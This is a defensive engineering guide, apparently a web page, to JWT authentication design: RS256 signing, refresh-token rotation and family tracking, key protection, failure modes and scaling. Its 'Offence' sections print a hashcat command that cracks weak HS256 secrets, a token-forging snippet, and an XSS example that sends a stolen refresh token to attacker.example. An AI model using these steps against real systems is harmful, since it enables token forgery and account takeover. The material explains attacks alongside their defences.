01 — Narrative

The lifecycle

RS256 throughout: the auth service signs with an RSA private key, resource APIs verify with the public key. Resource APIs therefore never hold anything that can mint a token, which is the single most important architectural decision here.

  • T+0Credential submission A plain POST with email and password. Rate limiting runs before any hashing, keyed on the email rather than only the IP, because a distributed attacker makes few requests per address.
  • T+200–400 msVerification Look up the user, run Argon2id against the stored hash, and compare with a constant-time function. The 300 ms is not a performance problem, it is the product.
  • T+400 msIssuance Sign a JWT with a 15-minute expiry and a UUIDv4 jti. Generate 32 random bytes as the refresh token, return the plaintext to the client exactly once, and persist only SHA-256(token) along with a family_id, an IP hash and a user-agent hash.
  • steady stateResource access Every API call carries the JWT. The resource API verifies the signature locally against a cached public key. No call to the auth service, no database read. This is why a JWT fleet scales horizontally with no shared state.
  • T+15 minSilent refresh The client detects expiry, either proactively by reading exp or reactively on a 401. The refresh endpoint hashes the presented token, finds an unrevoked unexpired record, issues a new pair, and marks the old one consumed. The user notices nothing.
  • logoutRevocation Revoke the refresh token record and add the access token's jti to Redis with a TTL equal to its remaining life. The blacklist can therefore never grow beyond one entry per concurrent user, and expired tokens are rejected by exp without touching Redis at all.
Latency budget, for calibration
300 msArgon2id — deliberate
3 msRSA sign
1 msRSA verify per request
8 msrefresh token DB write

Login is ~350 ms and dominated entirely by the key derivation function. Every subsequent request is ~1 ms. If your login latency is not dominated by the KDF, your KDF parameters are too weak.

02 — Structure

Anatomy of the token

The refresh token is deliberately not a JWT

It is 32 bytes from a CSPRNG, base64url-encoded. It carries no claims because it needs none: its meaning is a database row. That row is looked up by SHA-256(token), so a full database dump yields hashes rather than usable credentials, exactly as with passwords.

Making the refresh token a JWT is a common and self-defeating choice. You would gain statelessness on a path that must be stateful in order to support rotation and revocation.

03 — Verification

The validation pipeline

The user-disabled window

Disabling an account in the database does not invalidate issued tokens. Three options, in increasing cost: accept the window and keep exp short; cache the active flag in Redis and check it during validation, which is the same cost as a blacklist check; or use opaque reference tokens and give up statelessness entirely. Pick based on how quickly a "revoke this employee now" request has to take effect.

04 — Rotation

Rotation and families

Rotation alone limits exposure. Family tracking turns rotation into a detector, which is a much stronger property.

CREATE TABLE refresh_tokens (
  token_hash   CHAR(64) NOT NULL UNIQUE,   # SHA-256 hex — never the plaintext
  user_id      UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  family_id    UUID NOT NULL,             # set once, carried through every rotation
  issued_at    TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  expires_at   TIMESTAMPTZ NOT NULL,       # NOW() + 30 days
  last_used_at TIMESTAMPTZ,
  revoked_at   TIMESTAMPTZ,                # NULL means active
  ip_hash      CHAR(64), ua_hash CHAR(64)  # for anomaly detection, not for enforcement
);
CREATE INDEX idx_rt_family ON refresh_tokens(family_id);
CREATE INDEX idx_rt_expires ON refresh_tokens(expires_at);   # the cleanup job needs this
Rotation's own failure mode

A mobile client that crashes between receiving a new token and persisting it holds a token the server has already revoked. Its next refresh looks exactly like theft, and the user is logged out for no reason.

The fix is a grace period: accept a token revoked within the last few seconds if the replacement has not yet been used, and only treat it as compromise if the successor has been used. This keeps the detector while removing the false positive.

06 — Keys

Keys and rotation

The RSA private key is the whole system

Compromise means forging any token, for any user, with any roles, indefinitely, with no detectable trace. Protect it accordingly:

  • Never on disk in plaintext. Fetched at startup from KMS or Vault via an IAM-authenticated call, cached in memory only.
  • HSM-backed KMS is the strong version. The key is generated inside the HSM and never leaves it; the service asks the HSM to sign. A fully compromised process can then request signatures but cannot exfiltrate the key.
  • Only the auth service holds kms:Sign. Resource APIs need the public key and nothing else, which is the reason to use RS256 rather than HS256 in the first place.
  • Every signing operation is audited in CloudTrail or the Vault audit log.
Never evict the JWKS cache without a replacement in hand

A resource API whose cache expires while the JWKS endpoint is unavailable cannot validate any token, and every authenticated request returns 401. That is a total outage caused by a cache TTL. Cache for 6 to 24 hours, refresh proactively, jitter the expiry across instances, and consider serving the JWKS from a static CDN-backed location as a fallback.

The KDF is also a denial-of-service primitive

if len(password) > 1024: reject BEFORE hashing

Two more controls belong here. Run the KDF in a fixed-size dedicated thread pool so a login spike cannot starve refreshes, logouts and health checks. And apply the rate limit before hashing, not after, or the limiter is protecting nothing.

What NIST SP 800-63B actually recommends

Enforce a minimum length and a hard maximum. Do not enforce composition rules — no required symbols, no forced rotation. Instead, check the submitted password against known-breached lists, which is the control that correlates with real-world compromise. Complexity rules push users toward predictable substitutions and add no measurable security.

08 — Design

Sessions versus tokens

PropertyServer-side sessionJWT
Revocationimmediate delete the recorddelayed until exp, or a blacklist
DB calls per request1 — the session lookup0 — or 1 if you blacklist

Claim freshnessread from DB each timeStale until re-issued
LogoutreliableUnreliable without a blacklist
Horizontal scalingSession store is a dependencyfully stateless

The decision rule. JWTs win when token lifetime is short and the application can tolerate a revocation delay measured in minutes. Sessions win when instantaneous logout is a hard requirement — financial, medical, government. If you find yourself adding a blacklist check to every request, you have rebuilt sessions with larger cookies, and you should reconsider whether the JWT was buying you anything.

09 — Offence

Forging tokens

HS256 with a weak secret is offline-crackable 
# attacker registers a free account and captures one valid token
hashcat -a 0 -m 16500 captured.jwt rockyou.txt
# mode 16500 = HMAC-SHA256 JWT. Billions of candidates per second on a GPU.
# "secret", "jwt_secret", the app's hostname — found in seconds.

# then:
forged = jwt.encode({"sub":"admin-uuid","roles":["admin"],"exp":far_future},
                    cracked_secret, algorithm="HS256")

The whole attack is offline after a single token is captured, so nothing is detectable until the forged token is used. And because one secret signs every token, cracking it forges tokens for every user including admins, with no kid-based containment available.

Use RS256. If HS256 is unavoidable for legacy reasons, the secret must be 256 bits from a CSPRNG, never a human-chosen string, and it must be rotated.

10 — Offence

Stealing and misusing them

Audience bypass — one valid token, two services

Service A (low privilege) issues:   {"aud": ["https://service-a.example.com"], "roles":["user"]}
Attacker presents that same token to Service B (high privilege).

Service B checks: signature ✓ (same signing key)   exp ✓
Service B does NOT check aud.
→ accepted. The attacker now operates in a service they were never authorised for.

The signature is valid for any audience because the signature covers the payload including aud. Only the recipient can enforce the restriction, and a recipient that skips the check is accepting tokens minted for someone else. In a multi-service estate sharing one auth service, this is the most commonly missing validation.

Refresh token theft via XSS

1. malicious script (XSS or a compromised npm package) runs in the victim's origin
2. localStorage.getItem('refresh_token')          ← only possible because it is there
3. fetch('https://attacker.example/collect?t=' + rt)
4. attacker refreshes from their own server, gets a fresh pair, and continues the chain
5. the victim's next refresh fails — they think they were just logged out

# with family tracking this becomes the detection in section 4.
# without it, the attacker holds access for the full 30-day refresh lifetime.
Clock skew is a stolen-token life extension

A validator with five minutes of skew tolerance accepts every token for five minutes past its stated expiry. That is a 33% extension of a fifteen-minute token, applied uniformly to legitimate and stolen tokens alike. Cap tolerance at 60 seconds, monitor NTP drift, and alert if any server clock moves more than a second out.

Low-entropy jti breaks the blacklist

If jti is an 8-byte value, a counter, or derived from user id plus timestamp, collisions are reachable and in some cases predictable. A collision means one user's blacklist entry blocks a different user's perfectly valid token, and a predictable scheme means an attacker can pre-compute one. Use UUIDv4: 128 bits of randomness puts the birthday bound around 2⁶⁴ tokens, which is not a number you will reach.

Payload disclosure

$ echo "eyJzdWIiOiIxMjMiLCJzc24iOiIxMjMtNDUtNjc4OSJ9" | base64 -d
{"sub":"123","ssn":"123-45-6789","salary":95000,
 "internal_db":"postgres.internal.example.com:5432"}

# no key required. base64url is encoding.
# the signature proves nobody CHANGED it, not that nobody can READ it.

The correct mental model is a signed postcard. Put in it only what authorization needs: sub, roles, scope and the standard claims. JWE exists for genuine payload confidentiality and brings enough key-management complexity that it is rarely the right answer.

11 — Failure modes

Failure modes

Argon2 saturates the CPU

One core handles roughly three logins per second at 300 ms each. A four-core instance handles twelve. A login spike therefore starves everything else on the process, including health checks, which causes the load balancer to remove healthy instances and make it worse.

Fix: isolate hashing in a fixed thread pool, apply backpressure by rejecting when the queue is deep, and autoscale on CPU with headroom at around 60%.

JWKS endpoint unavailable

If a resource API's cache expires while the auth service is down, every authenticated request fails. A cache TTL has become a total outage.

Fix: long cache, proactive refresh, jittered expiry, never evict without a replacement, and a static fallback copy.

Redis running out of memory

Both the blacklist and the rate-limit store live in Redis. With maxmemory-policy: noeviction all writes fail, and depending on your implementation the rate limiter then fails open or closed — you should know which. Use volatile-lru so keys with a TTL are evicted first, and alert at 80% of capacity.

The blacklist has a natural bound worth knowing: with TTLs equal to remaining token life, its maximum size is roughly one entry per concurrent user. An attacker forcing mass logouts makes users re-authenticate, which is disruptive, but it does not make the list unbounded.

Never in logs

JWT values and refresh token values — they are credentials, not identifiers. Passwords, including failed attempts. The RSA private key. Full IP addresses, which are PII in several jurisdictions, so hash them and keep coarse geography. Full email addresses in high-volume logs. Log the jti, not the token: it gives you every correlation you actually need and is useless to anyone who steals the log.

13 — Scaling

Scaling and drills

Argon2 on loginThe dominant bottleneck, deliberately. ~3 logins/sec/core. Scale the auth service horizontally and isolate hashing in its own thread pool so a login spike does not starve refresh and logout.
Refresh token writesEvery login writes; every refresh rotates. A single Postgres primary handles roughly 10k writes/sec, so this is rarely the limit. Partition by expires_at so cleanup is a partition drop rather than a bulk DELETE.
Read replicasUser lookups by email can go to replicas. Refresh token reads and writes must go to the primary — a stale read of a just-revoked token defeats the reuse detector.
RedisSingle-threaded per shard at roughly 100k ops/sec. Vertical first, cluster when the ceiling is real. Only needed on the hot path if you blacklist.
Resource APIsScale freely. Validation is pure CPU against a cached public key, with no shared state whatsoever. This is the property you bought.

Drills

  1. Forge with alg: none. Strip the signature, set the algorithm, present it. Then try the HS256 variant using the public key from your own JWKS endpoint as the secret. Both must fail.
  2. Trigger reuse detection. Refresh once, then present the old token. Confirm the entire family is revoked and that the event fires an alert.
  3. Test the grace period. Simulate a client that receives a new token and crashes before storing it. Confirm you do not lock out a legitimate user.
  4. Cross-service replay. Take a token minted for service A and present it to service B. If B accepts it, you have found the most common missing check in the estate.
  5. Rotate a key with traffic flowing. Follow all five steps, then deliberately skip step 4 in staging and measure how many requests fail.
  6. DoS your own login. Send a 1 MB password. Confirm you are rejected before any hashing happens, and watch memory while you do it.
  7. Kill the JWKS endpoint and let a resource API's cache expire. Whatever happens next is your real availability posture.
  8. Grep your logs for eyJ, which is the base64 prefix of every JWT header. Any hit is a credential sitting in your log store.

How to use this. Sections 1 to 3 are the mechanism. Sections 4 to 8 are the design decisions, all of which are trades between revocation speed and statelessness. Sections 9 and 10 are the attacks, which divide cleanly into forging tokens and stealing them. Sections 11 to 13 are operations.

The one idea to keep. A JWT is a snapshot of authorization taken at issue time and trusted until expiry. Everything difficult about this architecture follows from that one sentence: stale roles, unreliable logout, the blacklist that undoes your statelessness, and the fifteen-minute lifetime chosen to make all of it survivable. Choose the lifetime first, and the rest of the design follows.
